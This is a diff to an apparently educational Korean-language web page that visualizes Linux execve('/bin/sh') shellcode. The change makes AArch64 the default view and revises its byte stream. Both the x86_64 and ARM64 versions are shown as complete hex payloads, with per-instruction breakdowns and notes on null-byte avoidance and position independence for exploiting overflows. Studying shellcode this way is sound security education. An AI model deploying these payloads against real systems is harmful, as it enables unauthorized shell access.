@@ -179,15 +179,15 @@
 </div>
 
 <div class="arch-switch-bar">
-  <button class="arch-btn active" id="btnX86" onclick="setArch('x86')">x86_64 리눅스 (27 Bytes Null-Free)</button>
-  <button class="arch-btn" id="btnArm" onclick="setArch('arm')">ARM64 리눅스 (36 Bytes)</button>
+  <button class="arch-btn active" id="btnArm" onclick="setArch('arm')">AArch64 (ARM64 - 기본: 28 Bytes PIC)</button>
+  <button class="arch-btn" id="btnX86" onclick="setArch('x86')">x86_64 리눅스 (비교: 27 Bytes Null-Free)</button>
 </div>
 
 <div class="grid-layout">
   <!-- Left Panel: Assembly & Opcode Breakdown -->
   <div class="panel">
     <div class="panel-title">
-      <span>⚙️</span> <span id="panelArchTitle">x86_64 execve("/bin/sh", NULL, NULL) 분석</span>
+      <span>⚙️</span> <span id="panelArchTitle">AArch64 execve("/bin/sh", NULL, NULL) 분석</span>
     </div>
 
     <div class="bytecode-stream" id="rawByteStream">
@@ -211,39 +211,70 @@
   <!-- Right Panel: Critical Engineering Constraints -->
   <div class="panel">
     <div class="panel-title">
-      <span>🔒</span> 쉘코드 제작 시 3대 핵심 제약과 원리
+      <span>🔒</span> <span id="rightPanelTitle">AArch64 쉘코드 제작 3대 핵심 제약과 원리</span>
     </div>
 
-    <div class="rule-card">
-      <h4>1. Null Byte (\x00) 완벽 제거 원리</h4>
-      <p><code>strcpy()</code>, <code>gets()</code>, <code>sprintf()</code> 등 취약한 C 문자열 함수는 <code>\x00</code>을 문자열의 끝(Null Terminator)으로 인식하고 복사를 즉시 중단함. 따라서 <code>mov $0, %eax</code> (기계어: <code>b8 00 00 00 00</code>) 대신 <code>xor %eax, %eax</code> (기계어: <code>31 c0</code>)를 사용하여 널 바이트를 완전 제거함.</p>
+    <div class="rule-card" id="ruleCard1">
+      <!-- Rule 1 populated by JS -->
     </div>
 
-    <div class="rule-card" style="border-left-color: var(--accent-blue);">
-      <h4 style="color:var(--accent-blue);">2. 위치 독립성 (Position-Independent Code)</h4>
-      <p>공격 대상 프로세스의 스택 주소는 ASLR이나 환경 변수에 따라 계속 변할 수 있음. 따라서 하드코딩된 절대 주소를 일체 사용하지 않고, <code>push %rbx</code>를 통해 스택에 문자열을 직접 구성한 뒤 <code>mov %rsp, %rdi</code>로 현재 스택 주소를 참조하는 위치 독립적 테크닉을 구사함.</p>
+    <div class="rule-card" id="ruleCard2" style="border-left-color: var(--accent-blue);">
+      <!-- Rule 2 populated by JS -->
     </div>
 
-    <div class="rule-card" style="border-left-color: var(--accent-purple);">
-      <h4 style="color:var(--accent-purple);">3. 문자열 리틀 엔디언 역순 푸시 (Little-Endian)</h4>
-      <p><code>"/bin/sh"</code>는 7바이트이므로 8바이트 정렬을 맞추기 위해 슬래시를 하나 더 붙여 <code>"/bin//sh"</code> (8바이트)를 만듦. 리눅스는 리틀 엔디언이므로 메모리 역순인 <code>0x68732f2f6e69622f</code> ("hs//nib/") 값으로 레지스터에 적재한 뒤 스택에 PUSH함.</p>
+    <div class="rule-card" id="ruleCard3" style="border-left-color: var(--accent-purple);">
+      <!-- Rule 3 populated by JS -->
     </div>
 
-    <div style="background:var(--code-bg); padding:14px; border-radius:8px; border:1px solid var(--border); font-size:0.82rem; line-height:1.6; color:var(--text-dim);">
-      <strong style="color:var(--accent-green);">💡 시스템 콜 규약 요약:</strong><br>
-      • <strong>Syscall Number</strong>: <code>RAX = 59 (0x3b)</code><br>
-      • <strong>1st Arg (Filename)</strong>: <code>RDI = "/bin//sh"</code> 포인터<br>
-      • <strong>2nd Arg (Argv)</strong>: <code>RSI = ["/bin//sh", NULL]</code> 배열 포인터<br>
-      • <strong>3rd Arg (Envp)</strong>: <code>RDX = NULL (0)</code>
+    <div id="summaryBox" style="background:var(--code-bg); padding:14px; border-radius:8px; border:1px solid var(--border); font-size:0.82rem; line-height:1.6; color:var(--text-dim);">
+      <!-- Summary populated by JS -->
     </div>
   </div>
 </div>
 </div>
 
 <script>
+const armData = {
+  title: "AArch64 (ARM64) execve(\"/bin/sh\", NULL, NULL) 분석",
+  panelTitle: "AArch64 쉘코드 제작 3대 핵심 제약과 원리",
+  stream: "\\xa0\\x00\\x00\\x10\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xa8\\x1b\\x80\\xd2\\x01\\x00\\x00\\xd4\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00",
+  rule1: `<h4>1. 고정 4바이트(Fixed 32-bit) RISC 인코딩</h4>
+          <p>AArch64는 모든 명령어가 정확히 4바이트(32비트)로 정렬됨. CISC와 달리 가변 바이트가 아니므로 <code>svc #0</code>(<code>\\x01\\x00\\x00\\xd4</code>) 등 명령어 자체에 필연적으로 <code>\\x00</code>이 포함됨. 따라서 바이트 스트림(Socket/Read) 또는 디코더 스텁 기법을 병행함.</p>`,
+  rule2: `<h4 style="color:var(--accent-blue);">2. PC 상대 주소 지정 (Position-Independent Code)</h4>
+          <p>AArch64에서는 <code>adr x0, #20</code> 명령어로 프로그램 카운터(PC) 기준 상대 오프셋으로 주소를 즉각 계산할 수 있어, 복잡한 JMP-CALL-POP 트램펄린 없이도 완벽한 위치 독립적 코드(PIC)를 구현함.</p>`,
+  rule3: `<h4 style="color:var(--accent-purple);">3. 제로 레지스터(xzr)와 시스템 콜(svc #0)</h4>
+          <p>AArch64 하드웨어 전용 제로 레지스터 <code>xzr</code>을 사용하여 <code>argv</code>(X1) 및 <code>envp</code>(X2)를 손쉽게 NULL(0)로 세팅함. 시스템 콜 번호는 <code>X8</code>에 적재하며, <code>svc #0</code>로 EL1 수퍼바이저 커널 모드로 전환함.</p>`,
+  summary: `<strong style="color:var(--accent-green);">💡 AArch64 시스템 콜 규약 요약:</strong><br>
+            • <strong>Syscall Number</strong>: <code>X8 = 221 (0xdd)</code><br>
+            • <strong>1st Arg (Filename)</strong>: <code>X0 = "/bin/sh"</code> 포인터 (PC 상대 참조)<br>
+            • <strong>2nd Arg (Argv)</strong>: <code>X1 = NULL (xzr)</code><br>
+            • <strong>3rd Arg (Envp)</strong>: <code>X2 = NULL (xzr)</code>`,
+  rows: [
+    { hex: "a0 00 00 10", asm: "adr x0, #20", desc: "X0 = PC+20 오프셋의 '/bin/sh' 문자열 주소 적재" },
+    { hex: "e1 03 1f aa", asm: "mov x1, xzr", desc: "X1 = 0 (2nd 인자: argv = NULL)" },
+    { hex: "e2 03 1f aa", asm: "mov x2, xzr", desc: "X2 = 0 (3rd 인자: envp = NULL)" },
+    { hex: "a8 1b 80 d2", asm: "mov x8, #0xdd", desc: "X8 = 221 (__NR_execve 시스템 콜 번호)" },
+    { hex: "01 00 00 d4", asm: "svc #0", desc: "EL1 커널 진입 (Supervisor Call) ➔ 쉘 획득!" },
+    { hex: "2f 62 69 6e", asm: ".ascii \"/bin\"", desc: "인라인 내장 경로 문자열 (4바이트)" },
+    { hex: "2f 73 68 00", asm: ".asciz \"/sh\"", desc: "인라인 내장 경로 문자열 및 종료 널 (4바이트)" }
+  ]
+};
+
 const x86Data = {
   title: "x86_64 execve(\"/bin/sh\", NULL, NULL) 분석",
+  panelTitle: "x86_64 쉘코드 제작 3대 핵심 제약과 원리",
   stream: "\\x31\\xc0\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05",
+  rule1: `<h4>1. Null Byte (\\x00) 완벽 제거 원리</h4>
+          <p><code>strcpy()</code>, <code>gets()</code>, <code>sprintf()</code> 등 취약한 C 문자열 함수는 <code>\\x00</code>을 문자열의 끝(Null Terminator)으로 인식하고 복사를 즉시 중단함. 따라서 <code>mov $0, %eax</code> (기계어: <code>b8 00 00 00 00</code>) 대신 <code>xor %eax, %eax</code> (기계어: <code>31 c0</code>)를 사용하여 널 바이트를 완전 제거함.</p>`,
+  rule2: `<h4 style="color:var(--accent-blue);">2. 위치 독립성 (Position-Independent Code)</h4>
+          <p>공격 대상 프로세스의 스택 주소는 ASLR이나 환경 변수에 따라 계속 변할 수 있음. 따라서 하드코딩된 절대 주소를 일체 사용하지 않고, <code>push %rbx</code>를 통해 스택에 문자열을 직접 구성한 뒤 <code>mov %rsp, %rdi</code>로 현재 스택 주소를 참조하는 위치 독립적 테크닉을 구사함.</p>`,
+  rule3: `<h4 style="color:var(--accent-purple);">3. 문자열 리틀 엔디언 역순 푸시 (Little-Endian)</h4>
+          <p><code>"/bin/sh"</code>는 7바이트이므로 8바이트 정렬을 맞추기 위해 슬래시를 하나 더 붙여 <code>"/bin//sh"</code> (8바이트)를 만듦. 리눅스는 리틀 엔디언이므로 메모리 역순인 <code>0x68732f2f6e69622f</code> ("hs//nib/") 값으로 레지스터에 적재한 뒤 스택에 PUSH함.</p>`,
+  summary: `<strong style="color:var(--accent-green);">💡 x86_64 시스템 콜 규약 요약:</strong><br>
+            • <strong>Syscall Number</strong>: <code>RAX = 59 (0x3b)</code><br>
+            • <strong>1st Arg (Filename)</strong>: <code>RDI = "/bin//sh"</code> 포인터<br>
+            • <strong>2nd Arg (Argv)</strong>: <code>RSI = ["/bin//sh", NULL]</code> 배열 포인터<br>
+            • <strong>3rd Arg (Envp)</strong>: <code>RDX = NULL (0)</code>`,
   rows: [
     { hex: "31 c0", asm: "xor %eax, %eax", desc: "EAX=0 초기화 (문자열 종료 널 바이트 준비)" },
     { hex: "48 bb 2f 62 69 6e 2f 2f 73 68", asm: "movabs $0x68732f2f6e69622f, %rbx", desc: "RBX = '/bin//sh' (리틀엔디언 8바이트)" },
@@ -258,25 +289,19 @@ const x86Data = {
   ]
 };
 
-const armData = {
-  title: "ARM64 execve(\"/bin/sh\", NULL, NULL) 분석",
-  stream: "\\xe0\\x03\\x1f\\xaa\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xa8\\x1b\\x80\\xd2\\x01\\x00\\x00\\xd4",
-  rows: [
-    { hex: "e1 03 1f aa", asm: "mov x1, xzr", desc: "X1 = 0 (2nd 인자: argv = NULL)" },
-    { hex: "e2 03 1f aa", asm: "mov x2, xzr", desc: "X2 = 0 (3rd 인자: envp = NULL)" },
-    { hex: "a8 1b 80 d2", asm: "mov x8, #0xdd", desc: "X8 = 221 (ARM64 __NR_execve 시스템 콜 번호)" },
-    { hex: "00 00 80 d2", asm: "adr x0, path", desc: "X0 = '/bin/sh' 주소 적재 (PC 상대 참조)" },
-    { hex: "01 00 00 d4", asm: "svc #0", desc: "EL1 커널 진입 (Supervisor Call) ➔ 쉘 획득!" }
-  ]
-};
-
 function setArch(arch) {
-  document.getElementById('btnX86').classList.toggle('active', arch === 'x86');
   document.getElementById('btnArm').classList.toggle('active', arch === 'arm');
+  document.getElementById('btnX86').classList.toggle('active', arch === 'x86');
 
-  const d = arch === 'x86' ? x86Data : armData;
+  const d = arch === 'arm' ? armData : x86Data;
   document.getElementById('panelArchTitle').textContent = d.title;
-  document.getElementById('rawByteStream').innerHTML = `<span class="safe-byte-tag">[Raw Hex Opcode Stream - Total ${d.rows.length} instructions]</span><br>${d.stream}`;
+  document.getElementById('rightPanelTitle').textContent = d.panelTitle;
+  document.getElementById('ruleCard1').innerHTML = d.rule1;
+  document.getElementById('ruleCard2').innerHTML = d.rule2;
+  document.getElementById('ruleCard3').innerHTML = d.rule3;
+  document.getElementById('summaryBox').innerHTML = d.summary;
+
+  document.getElementById('rawByteStream').innerHTML = `<span class="safe-byte-tag">[Raw Hex Opcode Stream - Total ${d.rows.length} entries]</span><br>${d.stream}`;
 
   const tbody = document.getElementById('asmTableBody');
   tbody.innerHTML = d.rows.map(r => `
@@ -342,8 +367,8 @@ if (window.ResizeObserver) {
   }
 }
 
-// Default x86
-setArch('x86');
+// Default ARM64
+setArch('arm');
 </script>
 
 </body>
